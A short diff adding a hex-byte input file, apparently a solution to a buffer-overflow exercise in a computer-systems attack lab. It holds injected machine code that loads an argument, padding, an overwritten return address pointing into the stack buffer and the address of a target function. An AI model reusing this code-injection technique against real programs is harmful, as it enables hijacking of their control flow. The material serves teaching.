@@ -1,0 +1,17 @@
+/* move argument string in, which is 31 62 39 33 37 34 37 63 */
+48 c7 c7 50 49 62 55
+
+/* return */
+c3
+
+/* padding */
+11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11
+
+/* exploit address, changes based on buffer */
+28 49 62 55 00 00 00 00
+
+/* implode address */
+b7 18 40 00 00 00 00 00
+
+/* arg string */
+31 62 39 33 37 34 37 63
